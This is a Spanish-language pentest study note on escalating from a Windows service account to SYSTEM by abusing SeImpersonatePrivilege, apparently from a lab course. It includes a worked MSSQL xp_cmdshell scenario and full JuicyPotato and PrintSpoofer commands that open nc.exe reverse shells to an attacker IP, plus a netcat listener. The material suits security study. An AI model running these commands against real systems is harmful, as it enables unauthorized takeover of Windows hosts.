tags:
___
# 🗂️ SeImpersonate y SeAssignPrimaryToken — Escalada a SYSTEM

## 🧠 Concepto clave

`SeImpersonatePrivilege` y `SeAssignPrimaryToken` son dos de los privilegios más frecuentemente abusados en escalada de privilegios. Aparecen habitualmente en cuentas de servicio y permiten, mediante distintas herramientas, escalar directamente a `NT AUTHORITY\SYSTEM`.

| Privilegio | Qué es | Riesgo / Explotación |
|---|---|---|
| `SeImpersonatePrivilege` | Permite a un proceso suplantar la identidad de otro usuario o cuenta tras autenticarse | Si una cuenta de servicio lo tiene, un atacante puede forzar a un proceso SYSTEM a conectarse al suyo y capturar su token — base de los ataques Potato |
| `SeAssignPrimaryTokenPrivilege` | Permite reemplazar el token principal de un proceso, es decir, cambiar la identidad bajo la que corre | Similar a SeImpersonate pero usa `CreateProcessAsUser` — JuicyPotato puede abusar de ambos indistintamente con el flag `-t *` |

## 📌 Puntos importantes

### Cómo funciona la impersonación

En Windows, cada proceso tiene un token que describe la cuenta bajo la que corre. Estos tokens no son recursos seguros en sí mismos — residen en memoria y podrían localizarse por fuerza bruta. Para poder usar el token de otro proceso, se necesita `SeImpersonatePrivilege`. Este privilegio solo se concede a cuentas administrativas y, en sistemas bien hardenizados, suele eliminarse.

Los programas legítimos usan esta mecánica para escalar de Administrador a Local System: hacen una llamada al proceso WinLogon para obtener un token SYSTEM y se re-ejecutan con él. Los atacantes explotan exactamente el mismo mecanismo con los ataques **Potato** — donde una cuenta de servicio con `SeImpersonatePrivilege` engaña a un proceso que corre como SYSTEM para que se conecte al suyo propio, entregando así el token. Para más detalle sobre los distintos tipos de ataques de impersonación de tokens, este paper es una lectura muy recomendada: 📄 [Abusing Token Privileges for EoP — hatRiot](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)

### ¿Cuándo aparece este privilegio?

Este privilegio es muy común al obtener ejecución de código remoto a través de aplicaciones que corren como cuentas de servicio. Los escenarios más típicos son:

- Subir una web shell a una aplicación ASP.NET en IIS
- Conseguir RCE a través de una instalación de Jenkins
- Ejecutar comandos mediante queries en MSSQL con `xp_cmdshell`

Siempre que se obtenga acceso por alguna de estas vías, **lo primero es comprobar `whoami /priv`** — si `SeImpersonatePrivilege` aparece en la lista, la escalada a SYSTEM suele ser cuestión de minutos.

---

### Ejemplo práctico — JuicyPotato sobre MSSQL

El escenario del ejemplo parte de credenciales SQL obtenidas de un archivo `logins.sql` en un file share (encontrado con **Snaffler**). Con esas credenciales se accede al servidor MSSQL, se habilita `xp_cmdshell` para ejecutar comandos del sistema operativo, y se confirma que la cuenta de servicio tiene `SeImpersonatePrivilege` activo.

**JuicyPotato** explota este privilegio abusando de DCOM/NTLM reflection: crea un servidor COM local, fuerza a un proceso SYSTEM a conectarse a él, captura su token y lo usa para lanzar un proceso nuevo como SYSTEM. En la práctica, se le pasa el puerto COM a usar, el binario a ejecutar y los argumentos — en este caso, una reverse shell con `nc.exe`.

El flujo completo es:
1. Conectar al servidor MSSQL con `mssqlclient.py` (Impacket)
2. Habilitar `xp_cmdshell` para ejecutar comandos del SO
3. Confirmar que `SeImpersonatePrivilege` está `Enabled`
4. Subir `JuicyPotato.exe` y `nc.exe` al servidor
5. Levantar un listener en la máquina atacante
6. Ejecutar JuicyPotato vía `xp_cmdshell` apuntando al listener
7. Recibir shell como `NT AUTHORITY\SYSTEM`

### Limitaciones de JuicyPotato y alternativas

JuicyPotato **no funciona en Windows Server 2019 ni en Windows 10 build 1809 en adelante**. Microsoft parcheó el vector DCOM que utilizaba. Para estos sistemas existen dos alternativas:

- **PrintSpoofer** — Abusa del servicio Print Spooler para forzar una conexión SYSTEM a un named pipe controlado por el atacante. Funciona en Windows 10 y Server 2019. Puede usarse para obtener una shell interactiva, un proceso en el escritorio o una reverse shell. 📄 [PrintSpoofer — Abusing Impersonate Privileges — itm4n](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- **RoguePotato** — Evolución de JuicyPotato que usa un mecanismo diferente para obtener el token SYSTEM, también válido en sistemas donde JuicyPotato falla.

La elección entre una u otra depende de la versión del SO objetivo — conocer cuál aplica en cada caso es esencial.

---

## 🛠️ Comandos / Herramientas

> [!tip] Conectar a un servidor MSSQL con autenticación Windows
> ```bash
> mssqlclient.py sql_dev@10.129.43.30 -windows-auth
> ```
> `sql_dev@10.129.43.30` — Usuario y dirección IP del servidor MSSQL.
> `-windows-auth` — Usa autenticación Windows en lugar de autenticación SQL nativa.

> [!tip] Habilitar xp_cmdshell desde la shell de Impacket
> ```sql
> enable_xp_cmdshell
> ```
> `enable_xp_cmdshell` — Comando especial de la shell de Impacket que activa el stored procedure `xp_cmdshell` y ejecuta automáticamente `RECONFIGURE`.

> [!tip] Ejecutar comandos del SO a través de xp_cmdshell
> ```sql
> xp_cmdshell whoami /priv
> ```
> `xp_cmdshell` — Stored procedure de MSSQL que permite ejecutar comandos del sistema operativo bajo el contexto de la cuenta de servicio SQL.

> [!tip] Escalar a SYSTEM con JuicyPotato lanzando una reverse shell
> ```cmd
> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
> ```
> `-l` — Puerto del servidor COM local que JuicyPotato levanta para el ataque.
> `-p` — Binario a ejecutar con el token SYSTEM obtenido.
> `-a` — Argumentos pasados al binario — en este caso, una reverse shell con nc.exe.
> `-t *` — Indica a JuicyPotato que pruebe tanto `CreateProcessWithTokenW` (requiere `SeImpersonatePrivilege`) como `CreateProcessAsUser` (requiere `SeAssignPrimaryTokenPrivilege`).

> [!tip] Levantar un listener para recibir la reverse shell
> ```bash
> sudo nc -lnvp 8443
> ```
> `-l` — Modo escucha (listener).
> `-n` — No resolver nombres DNS.
> `-v` — Modo verbose.
> `-p 8443` — Puerto en el que escuchar.

> [!tip] Escalar a SYSTEM con PrintSpoofer lanzando una reverse shell
> ```cmd
> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
> ```
> `-c` — Comando a ejecutar en el contexto SYSTEM una vez que PrintSpoofer captura el token.

## 🔗 Relaciones / Contexto

Este ataque encadena directamente con la sección anterior de privilegios: `SeImpersonatePrivilege` es uno de los privilegios más peligrosos precisamente porque se asigna por defecto a cuentas de servicio legítimas como `NETWORK SERVICE` o `LOCAL SERVICE`. La ruta típica en un pentest real es: RCE sobre una aplicación web o base de datos → shell como cuenta de servicio → `SeImpersonatePrivilege` presente → JuicyPotato / PrintSpoofer → SYSTEM. Es uno de los caminos de escalada más frecuentes y rápidos en entornos Windows.